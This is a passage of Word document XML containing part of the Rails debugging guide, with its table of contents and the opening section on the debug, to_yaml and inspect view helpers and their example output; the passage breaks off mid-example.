    <w:p w14:paraId="15C8A2FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId770" w:anchor="3-8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Catching Exceptions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4D21573E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId771" w:anchor="3-9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Resuming Execution</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="131CBA1F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId772" w:anchor="3-10" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Editing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="501CED82" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId773" w:anchor="3-11" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Quitting</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="00D0818D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId774" w:anchor="3-12" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Settings</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A06B239" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId775" w:anchor="4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Debugging Memory Leaks</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DF010CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId776" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>BleakHouse</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DC12A1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId777" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Valgrind</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="467989BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId778" w:anchor="5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Plugins for Debugging</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FA593B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId779" w:anchor="6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>References</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E1FAF16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 View Helpers for Debugging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308CCB44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>One common task is to inspect the contents of a variable. In Rails, you can do this with three methods:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245EB53D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="346"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="605BAE37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="346"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_yaml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383751A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="346"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inspect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D43DC5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F69C92E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper will return a &lt;pre&gt;-tag that renders the object using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> format. This will generate human-readable data from any object. For example, if you have this code in a view:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2C2D5856" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4857CB0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%= debug @post %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B153D09" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28D36C85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51F6F3AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=h @post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09EEE0A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="62A2A3C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You’ll see something like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="196E431E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1471B62E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>--- !ruby/object:Post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6966AE9E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attributes:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2345CE2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  updated_at: 2008-09-05 22:55:47</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4803419B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  body: It's a very helpful guide for debugging your Rails app.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FF8A60F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  title: Rails debugging guide</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4107639E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  published: t</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="538579E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  id: "1"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42A20355" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  created_at: 2008-09-05 22:55:47</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C66B61C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attributes_cache: {}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B652F07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23CA1E19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BF176FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Title: Rails debugging guide</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="361197C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_yaml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF7E0B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Displaying an instance variable, or any other object or method, in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> format can be achieved this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0E86C385" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F74B441" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%= simple_format @post.to_yaml %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B341168" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="278C9CEC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="586CD0EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=h @post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61979046" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="630782FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_yaml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method converts the method to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> format leaving it more readable, and then the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>simple_format</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper is used to render each line as in the console. This is how </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method does its magic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3238C3D5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>As a result of this, you will have something like this in your view:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1DC9725A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46BD8464" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>--- !ruby/object:Post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F8CCB23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attributes:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="075A039E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>updated_at: 2008-09-05 22:55:47</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2349684B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>body: It's a very helpful guide for debugging your Rails app.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5232B8F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>title: Rails debugging guide</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EEE027D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>published: t</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BE268CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id: "1"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07DB4FD3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>created_at: 2008-09-05 22:55:47</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="039212D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attributes_cache: {}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15E99CFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E38A2C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Title: Rails debugging guide</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5434BA2A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inspect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D6C470" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another useful method for displaying object values is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inspect</w:t>
      </w:r>
      <w:r>
        <w:t>, especially when working with arrays or hashes. This will print the object value as a string. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="52F9D52E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B3AB4BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%= [1, 2, 3, 4, 5].inspect %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3634650B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
